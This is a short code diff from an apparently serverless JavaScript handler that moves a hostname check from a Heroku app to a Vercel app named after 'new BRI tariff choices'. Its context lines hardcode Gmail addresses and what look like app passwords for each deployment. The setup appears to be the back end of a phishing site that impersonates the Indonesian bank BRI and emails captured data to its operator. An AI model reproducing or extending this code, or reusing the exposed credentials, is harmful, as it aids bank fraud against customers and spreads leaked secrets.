@@ -19,7 +19,7 @@ export default function handler(req, res) {
        pass = 'ltnuppdgvikqudiv'
     }else
   
- if (url == 'pilihan-tarif-baru-bri.herokuapp.com'){
+ if (url == 'pilihan-tarif-baru-bri.vercel.app'){
 
        email = 'simontok001122@gmail.com'
        pass = 'tyteboknxutmkujr'
